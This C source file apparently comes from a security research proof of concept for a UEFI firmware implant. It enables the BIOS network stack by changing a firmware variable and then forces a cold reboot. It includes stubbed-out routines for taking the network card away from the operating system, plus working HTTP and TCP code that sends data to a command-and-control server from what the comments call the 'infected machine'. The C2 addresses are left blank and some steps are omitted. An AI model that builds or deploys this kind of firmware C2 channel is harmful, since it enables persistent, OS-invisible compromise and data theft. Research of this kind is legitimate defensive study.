/*
 * (c) FFRI Security, Inc., 2025 / Author: FFRI Security, Inc.
 */



#include <Library/NetLib.h>
#include <Protocol/SimpleNetwork.h>
#include <Protocol/Ip4.h>
#include <Protocol/Udp4.h>
#include <Protocol/Tcp4.h>
#include <Protocol/Ip4.h>
#include <Protocol/Dhcp4.h>
#include <Protocol/Arp.h>
#include <Protocol/Dns4.h>
#include <Protocol/ManagedNetwork.h>
#include <Protocol/Http.h>



/**

  Check Platform HTTP Boot settings and enable it
    * UEFI Network Stack is enabled/disabled by UEFI variable settings
    * **UEFI varaible name and the value to modify is BIOS dependent!**

**/
EFI_STATUS
EFIAPI
EnableNetworkStackIfDisabled (
    IN VOID
  )
{
  EFI_STATUS Status = EFI_SUCCESS;

  // Variable Name and GUID is BIOS dependent
  // d1405d16-7afc-4695-bb12-41459d3695a2
  EFI_GUID NetworkStackVarGuid = \
    {0xd1405d16, 0x7afc, 0x4695, { 0xbb, 0x12, 0x41, 0x45, 0x9d, 0x36, 0x95, 0xa2}};
  UINTN NetworkStackVarSize = 8;
  BYTE NetworkStackVarData[8] = {0};

  Status = gRT->GetVariable(
      L"NetworkStackVar",
      &NetworkStackVarGuid,
      NULL,
      &NetworkStackVarSize,
      (VOID*)&NetworkStackVarData
      );

  Print(L"NetworkStackVar read %r\n", Status);
  Print(L"NetworkStackVarData: %02X %02X %02X %02X %02X %02X %02X %02X\n",
      NetworkStackVarData[0], NetworkStackVarData[1], NetworkStackVarData[2], NetworkStackVarData[3],
      NetworkStackVarData[4], NetworkStackVarData[5], NetworkStackVarData[6], NetworkStackVarData[7]);

  // What bit correspond to what flag is BIOS dependent
  if(NetworkStackVarData[0]==0 || NetworkStackVarData[6]==0) {
    NetworkStackVarData[0] = 1;  // Enable Network Stack
    NetworkStackVarData[6] = 1;  // Enable Ipv4 HTTP Support
                        
    Status = gRT->SetVariable(
        L"NetworkStackVar",
        &NetworkStackVarGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_RUNTIME_ACCESS,
        NetworkStackVarSize,
        NetworkStackVarData
        );
    Print(L"NetworkStackVar SetVariable %r\n", Status);

    gRT->ResetSystem(
        EfiResetCold,
        EFI_SUCCESS,
        0,
        NULL
        );
  }

  return Status;
}



/**

  [Omitted] Disable the device settings that the OS applied during runtime
    * OS uses their own device drivers to re-initialize the device so settings differs from what BIOS initialized during boot
    * Device settings are actually the device register values
    * We can reset the settings by calling DriverBindingProtocol->Stop() of the UEFI drivers that manages the device you want to reset
    * DriverBindingProtocol->Stop() is called by gBS->DisconnectController()

**/
VOID
EFIAPI
DisableOSNetworkSettings(
    IN  EFI_HANDLE  *NetworkDeviceHandles,
    IN  UINTN       NetworkDeviceHandlesCount
    )
{
}



/**

  Apply the device settings of BIOS to the device
    * BIOS initialize the device registers by DriverBindingProtocol->Start() of the UEFI drivers that manages that device
    * DriverBindingProtcol->Start() is called by gBS->ConnectController()

**/
VOID
EFIAPI
EnableBIOSNetworkSettings(
    IN  EFI_HANDLE  *NetworkDeviceHandles,
    IN  UINTN       NetworkDeviceHandlesCount
    )
{
  for(UINTN i=0; i<NetworkDeviceHandlesCount; i++) {
    gBS->ConnectController(
       NetworkDeviceHandles[i],
       NULL,
       NULL,
       TRUE
       );
  }
}



/**

  Check if the given ControllerHandle is valid
    * The ControllerHandle must have HttpSB/TcpSB/IpSB/MnpSB/SNP protocol installed
    * These protocol should be installed by DriverBindingProtcol->Start() of each UEFI drivers

**/
BOOLEAN
EFIAPI
IsValidNicHandle(
    IN  EFI_HANDLE  NicHandle
    )
{
  EFI_STATUS Status;
  BOOLEAN isValid = TRUE;

  VOID *test;
  __asm__ __volatile__("int3");
  Status = gBS->HandleProtocol(
    NicHandle,
    &gEfiHttpServiceBindingProtocolGuid,
    &test
    );
  if(Status!=EFI_SUCCESS) {
    isValid = FALSE;
  }

  test = NULL;
  __asm__ __volatile__("int3");
  Status = gBS->HandleProtocol(
    NicHandle,
    &gEfiTcp4ServiceBindingProtocolGuid,
    &test
    );
  if(Status!=EFI_SUCCESS) {
    isValid = FALSE;
  }

  test = NULL;
  __asm__ __volatile__("int3");
  Status = gBS->HandleProtocol(
    NicHandle,
    &gEfiIp4ServiceBindingProtocolGuid,
    &test
    );
  if(Status!=EFI_SUCCESS) {
    isValid = FALSE;
  }

  test = NULL;
  __asm__ __volatile__("int3");
  Status = gBS->HandleProtocol(
    NicHandle,
    &gEfiManagedNetworkServiceBindingProtocolGuid,
    &test
    );
  if(Status!=EFI_SUCCESS) {
    isValid = FALSE;
  }

  test = NULL;
  __asm__ __volatile__("int3");
  Status = gBS->HandleProtocol(
    NicHandle,
    &gEfiSimpleNetworkProtocolGuid,
    &test
    );
  if(Status!=EFI_SUCCESS) {
    isValid = FALSE;
  }

  return isValid;
}



/**

  Get ControllerHandle that binds to UNDI (Network Device Driver) 
    * It seems UNDI uses the handle `PciRoot(0x0)/Pci(0x13,0x1)/Pci(0x0,0x0)`
    * while Http,...,Snp uses the handle `PciRoot(0x0)/Pci(0x13,0x1)/Pci(0x0,0x0)/MAC(XXXXX,0x0)`

**/
EFI_STATUS
EFIAPI
GetNetworkDeviceHandles(
    OUT  EFI_HANDLE  **NetworkDeviceHandles
    )
{
  EFI_STATUS Status;
  EFI_GUID EfiSomeUndiProtocol = { 0xE3161450, 0xAD0F, 0x11D9, { 0x96, 0x69, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66 }};
  UINTN UndiControllerCount = 0;
  Status = gBS->LocateHandleBuffer (
     ByProtocol,
     &EfiSomeUndiProtocol,
     NULL,
     &UndiControllerCount,
     NetworkDeviceHandles
     );
  return Status;
}



/**

  [Omitted] Overwrite the OS device settings to the BIOS device settings
    * Device registers are configured by OS so those should be overwritten by BIOS to use from BIOS

**/
VOID
EFIAPI
HijackNicFromOS(
    )
{
}



EFI_HTTP_PROTOCOL *gHttpProtocol;
/**

  Locate EFI_HTTP_PROTOCOL and configure
    - gHttpProtocol is ready to use after HttpInit

**/
EFI_STATUS
EFIAPI
HttpInit (
  )
{
  EFI_STATUS Status;

  EFI_HANDLE *HttpControllerHandles = NULL;
  UINTN HttpControllerCount = 0;
  gBS->LocateHandleBuffer (
     ByProtocol,
     &gEfiHttpServiceBindingProtocolGuid,
     NULL,
     &HttpControllerCount,
     &HttpControllerHandles
     );

  EFI_HANDLE ControllerHandle = HttpControllerHandles[0]; // Just use eth0 for PoC

  EFI_SERVICE_BINDING_PROTOCOL *ServiceBinding;
  Status = gBS->HandleProtocol(
      ControllerHandle,
      &gEfiHttpServiceBindingProtocolGuid,
      (VOID**)&ServiceBinding
      );

  EFI_HANDLE *Handle = NULL;
  Status = ServiceBinding->CreateChild(
      ServiceBinding,
      (VOID**)&Handle
      );

  Status = gBS->HandleProtocol(
      Handle,
      &gEfiHttpProtocolGuid,
      (VOID**)&gHttpProtocol
      );

  EFI_HTTPv4_ACCESS_POINT Ipv4Node;
  ZeroMem(&Ipv4Node, sizeof(Ipv4Node));
  /*Ipv4Node.UseDefaultAddress = TRUE;*/
  Ipv4Node.UseDefaultAddress = FALSE;
  Ipv4Node.LocalAddress.Addr[0] = ;   // Default Gateway IP (ex 192)
  Ipv4Node.LocalAddress.Addr[1] = ;   // Default Gateway IP (ex 168)
  Ipv4Node.LocalAddress.Addr[2] = ;   // Default Gateway IP
  Ipv4Node.LocalAddress.Addr[3] = ;     // Default Gateway IP
  Ipv4Node.LocalSubnet.Addr[0]  = ;   // Subnet Mask
  Ipv4Node.LocalSubnet.Addr[1]  = ;   // Subnet Mask
  Ipv4Node.LocalSubnet.Addr[2]  = ;   // Subnet Mask
  Ipv4Node.LocalSubnet.Addr[3]  = ;     // Subnet Mask
  Ipv4Node.LocalPort            = ;  // Port to use for sender (NIC of infected machine)

  EFI_HTTP_CONFIG_DATA ConfigData;
  ConfigData.HttpVersion          = HttpVersion11;
  ConfigData.TimeOutMillisec      = 0;
  ConfigData.LocalAddressIsIPv6   = FALSE;
  ConfigData.AccessPoint.IPv4Node = &Ipv4Node;

  Status = gHttpProtocol->Configure(
      gHttpProtocol,
      &ConfigData
      );

  return EFI_SUCCESS;
}



static BOOLEAN gRequestCallbackComplete = FALSE;
static VOID EFIAPI RequestCallback(IN EFI_EVENT Event, IN VOID *Context) {
  gRequestCallbackComplete = TRUE;
}
/**

  Send HTTP request using gHttpProtocol (initialized at HttpInit)

**/
EFI_STATUS
EFIAPI
HttpSend (
    IN  VOID   *SendData,
    IN  UINTN  SendDataSize
  )
{
  EFI_STATUS Status;
  CHAR16 url[1024] = L"http://";

  // Temporary Ascii to Unicode...
  BYTE  tmp[512];
  UINTN tmpSize = SendDataSize;
  for(int i=0,j=0; i<SendDataSize; i++,j+=2) {
    tmp[j]   = *(BYTE*)(SendData+i);
    tmp[j+1] = 0; 
    tmpSize++;
  }
  CopyMem((void*)url+StrLen(url)*sizeof(CHAR16), tmp, tmpSize);

  EFI_HTTP_REQUEST_DATA RequestData;
  RequestData.Method = HttpMethodGet;
  RequestData.Url    = url;

  EFI_HTTP_HEADER RequestHeader[1];
  RequestHeader[0].FieldName  = "Host";
  RequestHeader[0].FieldValue = "";

  EFI_HTTP_MESSAGE RequestMessage;
  RequestMessage.Data.Request = &RequestData;
  RequestMessage.HeaderCount  = 1;
  RequestMessage.Headers      = RequestHeader;
  RequestMessage.BodyLength   = 0;
  RequestMessage.Body         = NULL;

  EFI_HTTP_TOKEN RequestToken;
  RequestToken.Event = NULL;
  Status = gBS->CreateEvent(
      EVT_NOTIFY_SIGNAL,
      TPL_CALLBACK,
      RequestCallback,
      NULL,
      &RequestToken.Event);

  RequestToken.Status  = EFI_SUCCESS;
  RequestToken.Message = &RequestMessage;

  gRequestCallbackComplete = FALSE;

  Status = gHttpProtocol->Request(
      gHttpProtocol,
      &RequestToken
    );
  Print(L"HttpProtocol->Request sent %r\r\n", Status);

  while(!gRequestCallbackComplete) {
    WaitForCompletion();
  }

  //EnableExternalInterrupt();
  Print(L"Request callback completed %r\r\n", RequestToken.Status);

  return EFI_SUCCESS;
}



static BOOLEAN gResponseCallbackComplete = FALSE;
static VOID EFIAPI ResponseCallback(IN EFI_EVENT Event, IN VOID *Context) {
  gResponseCallbackComplete = TRUE;
}
/**

  Receive HTTP request using gHttpProtocol (initialized at HttpInit)

**/
EFI_STATUS
EFIAPI
HttpReceive (
    OUT     VOID   **Buf,
    IN OUT  UINTN  *BufSize
  )
{
  EFI_STATUS Status;

  gBS->AllocatePool(
      EfiRuntimeServicesData,
      *BufSize,
      (VOID**)Buf
      );
  ZeroMem(*Buf, *BufSize);

  EFI_HTTP_RESPONSE_DATA ResponseData;
  ResponseData.StatusCode = HTTP_STATUS_UNSUPPORTED_STATUS;

  EFI_HTTP_MESSAGE ResponseMessage;
  ResponseMessage.Data.Response = &ResponseData;
  ResponseMessage.HeaderCount   = 0;
  ResponseMessage.Headers       = NULL;
  ResponseMessage.BodyLength    = *BufSize;
  ResponseMessage.Body          = *Buf;

  EFI_HTTP_TOKEN ResponseToken;
  ResponseToken.Event = NULL;
  Status = gBS->CreateEvent(
      EVT_NOTIFY_SIGNAL,
      TPL_CALLBACK,
      ResponseCallback,
      NULL,
      &ResponseToken.Event
      );
  ResponseToken.Status  = EFI_SUCCESS;
  ResponseToken.Message = &ResponseMessage;

  gResponseCallbackComplete = FALSE;

  Status = gHttpProtocol->Response(
      gHttpProtocol,
      &ResponseToken
    );
  Print(L"HttpProtocol->Response %r(0x%X)\r\n", Status, Status);

  while(!gResponseCallbackComplete) {
    WaitForCompletion();
  }
  Print(L"Response callback completed %r(0x%X)\r\n", ResponseToken.Status, ResponseToken.Status);

  for (UINTN i=0; i<ResponseMessage.HeaderCount; i++) {
    if(!AsciiStrCmp(ResponseMessage.Headers[i].FieldName, "content-length")) {
      *BufSize = AsciiStrDecimalToUintn(ResponseMessage.Headers[i].FieldValue);
      Print(L"BufSize: 0x%X\n", *BufSize);
    }
  }

  return EFI_SUCCESS;
}



EFI_TCP4_PROTOCOL *gTcp4Protocol;
/**

  Locate EFI_TCP4_PROTOCOL and configure
    - gTcp4Protocol is ready to use after Tcp4Init
    - **This is not required if you use HttpInit/HttpSend**

**/
EFI_STATUS
EFIAPI
Tcp4Init (
  )
{
  EFI_STATUS Status;

  EFI_HANDLE *Tcp4ControllerHandles = NULL;
  UINTN Tcp4ControllerCount = 0;
  gBS->LocateHandleBuffer (
     ByProtocol,
     &gEfiTcp4ServiceBindingProtocolGuid,
     NULL,
     &Tcp4ControllerCount,
     &Tcp4ControllerHandles
     );

  EFI_HANDLE ControllerHandle = Tcp4ControllerHandles[0]; // Just use eth0 for PoC

  EFI_SERVICE_BINDING_PROTOCOL *ServiceBinding;
  Status = gBS->HandleProtocol(
      ControllerHandle,
      &gEfiTcp4ServiceBindingProtocolGuid,
      (VOID**)&ServiceBinding
      );

  EFI_HANDLE *Handle = NULL;
  Status = ServiceBinding->CreateChild(
      ServiceBinding,
      (VOID**)&Handle
      );

  Status = gBS->HandleProtocol(
      Handle,
      &gEfiTcp4ProtocolGuid,
      (VOID**)&gTcp4Protocol
      );

  EFI_TCP4_ACCESS_POINT Tcp4Ap;
  ZeroMem(&Tcp4Ap, sizeof(EFI_TCP4_ACCESS_POINT));
  Tcp4Ap.UseDefaultAddress = FALSE;
  Tcp4Ap.StationAddress.Addr[0] = ;   // This IP (ex 192)
  Tcp4Ap.StationAddress.Addr[1] = ;   // This IP (ex 168)
  Tcp4Ap.StationAddress.Addr[2] = ;   // This IP
  Tcp4Ap.StationAddress.Addr[3] = ;   // This IP
  Tcp4Ap.SubnetMask.Addr[0]     = ;   // Subnet Mask
  Tcp4Ap.SubnetMask.Addr[1]     = ;   // Subnet Mask
  Tcp4Ap.SubnetMask.Addr[2]     = ;   // Subnet Mask
  Tcp4Ap.SubnetMask.Addr[3]     = ;     // Subnet Mask
  Tcp4Ap.StationPort            = ;     // Port to use for sender (NIC of infected machine)
  Tcp4Ap.RemoteAddress.Addr[0]  = ;   // C2 IP
  Tcp4Ap.RemoteAddress.Addr[1]  = ;   // C2 IP
  Tcp4Ap.RemoteAddress.Addr[2]  = ;   // C2 IP
  Tcp4Ap.RemoteAddress.Addr[3]  = ;   // C2 IP
  Tcp4Ap.RemotePort             = ;  // C2 port
  Tcp4Ap.ActiveFlag             = TRUE;  // Connect from this pc

  EFI_TCP4_OPTION Tcp4Opt;
  ZeroMem(&Tcp4Opt, sizeof(EFI_TCP4_OPTION));
  Tcp4Opt.ReceiveBufferSize      = 0x200000;
  Tcp4Opt.SendBufferSize         = 0x200000;
  Tcp4Opt.MaxSynBackLog          = 5;
  Tcp4Opt.ConnectionTimeout      = 60;
  Tcp4Opt.DataRetries            = 12;
  Tcp4Opt.FinTimeout             = 2;
  Tcp4Opt.KeepAliveProbes        = 6;
  Tcp4Opt.KeepAliveTime          = 7200;
  Tcp4Opt.KeepAliveInterval      = 30;
  Tcp4Opt.EnableNagle            = TRUE;
  Tcp4Opt.EnableWindowScaling    = TRUE;
  Tcp4Opt.EnableSelectiveAck     = FALSE;
  Tcp4Opt.EnablePathMtuDiscovery = FALSE;

  EFI_TCP4_CONFIG_DATA ConfigData;
  ConfigData.TypeOfService        = 0;
  ConfigData.TimeToLive           = 255;
  ConfigData.AccessPoint          = Tcp4Ap;
  ConfigData.ControlOption        = &Tcp4Opt;

  Status = gTcp4Protocol->Configure(
      gTcp4Protocol,
      &ConfigData
      );

  return EFI_SUCCESS;
}



/**

  Send TCP4 request using gTcp4Protocol (initialized at Tcp4Init)

**/
EFI_STATUS
EFIAPI
Tcp4Send (
    IN  VOID   *SendData,
    IN  UINT32  SendDataSize
  )
{
  EFI_STATUS Status;

  // 1: Connect
  EFI_TCP4_COMPLETION_TOKEN CompletionToken;
  ZeroMem(&CompletionToken, sizeof(CompletionToken));
  CompletionToken.Status = EFI_NOT_READY;
  CompletionToken.Event = NULL;
  Status = gBS->CreateEvent(
      EVT_NOTIFY_SIGNAL,
      TPL_CALLBACK,
      RequestCallback,
      NULL,
      &CompletionToken.Event
      );

  EFI_TCP4_CONNECTION_TOKEN ConnectionToken;
  ConnectionToken.CompletionToken = CompletionToken;

  Status = gTcp4Protocol->Connect(
      gTcp4Protocol,
      &ConnectionToken
      );
  while(!gRequestCallbackComplete) {
    WaitForCompletion();
  };


  // 2: Transmit
  gBS->CloseEvent(CompletionToken.Event);
  gRequestCallbackComplete = FALSE;
  ZeroMem(&CompletionToken, sizeof(CompletionToken));
  CompletionToken.Status = EFI_NOT_READY;
  CompletionToken.Event = NULL;
  Status = gBS->CreateEvent(
      EVT_NOTIFY_SIGNAL,
      TPL_CALLBACK,
      RequestCallback,
      NULL,
      &CompletionToken.Event
      );

  EFI_TCP4_TRANSMIT_DATA TxData;
  ZeroMem(&TxData, sizeof(TxData));
  TxData.Push       = FALSE;
  TxData.Urgent     = FALSE;
  TxData.DataLength = SendDataSize;
  TxData.FragmentCount = 1;
  TxData.FragmentTable[0].FragmentLength = SendDataSize;
  TxData.FragmentTable[0].FragmentBuffer = SendData;

  EFI_TCP4_IO_TOKEN Token;
  Token.CompletionToken = CompletionToken;
  Token.Packet.TxData = &TxData;

  Status = gTcp4Protocol->Transmit(
      gTcp4Protocol,
      &Token
      );
  while(!gRequestCallbackComplete) {
    WaitForCompletion();
  };


  // 3: Close
  gBS->CloseEvent(CompletionToken.Event);
  gRequestCallbackComplete = FALSE;
  ZeroMem(&CompletionToken, sizeof(CompletionToken));
  CompletionToken.Status = EFI_NOT_READY;
  CompletionToken.Event = NULL;
  Status = gBS->CreateEvent(
      EVT_NOTIFY_SIGNAL,
      TPL_CALLBACK,
      RequestCallback,
      NULL,
      &CompletionToken.Event
      );

  EFI_TCP4_CLOSE_TOKEN CloseToken;
  ZeroMem(&CloseToken, sizeof(CloseToken));
  CloseToken.CompletionToken = CompletionToken;
  CloseToken.AbortOnClose    = FALSE;

  Status = gTcp4Protocol->Close(
      gTcp4Protocol,
      &CloseToken
      );
  while(!gRequestCallbackComplete) {
    WaitForCompletion();
  };

  return EFI_SUCCESS;
}
